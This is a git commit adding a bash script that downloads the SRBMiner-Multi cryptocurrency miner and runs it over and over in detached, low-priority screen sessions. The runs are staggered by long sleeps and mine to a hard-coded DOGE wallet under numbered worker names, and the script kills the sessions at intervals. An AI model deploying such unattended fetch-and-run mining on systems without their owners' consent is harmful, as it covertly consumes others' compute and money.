66c7245e664ae875fc6ecaf18537e0f2d1d70634
bibirbusin <132418678+bibirbusin@users.noreply.github.com>
2023-05-27 13:39:36 +0700

    Create sjc.sh

---
+++ dg/cpu/sjc.sh
@@ -0,0 +1,117 @@
+#!/bin/bash
+
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.0/SRBMiner-Multi-0-8-0-Linux.tar.xz
+tar -xvf SRBMiner-Multi-0-8-0-Linux.tar.xz
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc01,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc02,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc03,c=DOGE,zap=CPU --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc04,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc05,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc06,c=DOGE,zap=CPU --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc07,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc08,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc09,c=DOGE,zap=CPU --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc10,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc11,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc12,c=DOGE,zap=CPU --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc13,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc14,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc15,c=DOGE,zap=CPU --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc16,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc17,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc18,c=DOGE,zap=CPU --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc19,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc20,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc21,c=DOGE,zap=CPU --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc01,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc02,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc03,c=DOGE,zap=CPU --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc04,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc05,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc06,c=DOGE,zap=CPU --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc07,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc08,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc09,c=DOGE,zap=CPU --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc10,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc11,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc12,c=DOGE,zap=CPU --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc13,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc14,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc15,c=DOGE,zap=CPU --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc16,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc17,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc18,c=DOGE,zap=CPU --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc19,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc20,c=DOGE,zap=CPU --cpu-threads 1
+sleep 7200
+screen -d -m nice -n 19 ./SRBMiner-Multi-0-8-0/SRBMiner-MULTI --disable-gpu --algorithm cpupower --pool stratum+tcp://cpupower.eu.mine.zpool.ca:6240 --wallet D5ZqX61qzxDspwstNtFNnBsSabTAv39pLZ --password sjc21,c=DOGE,zap=CPU --cpu-threads 1
+sleep 43200
+screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
+sleep 7200
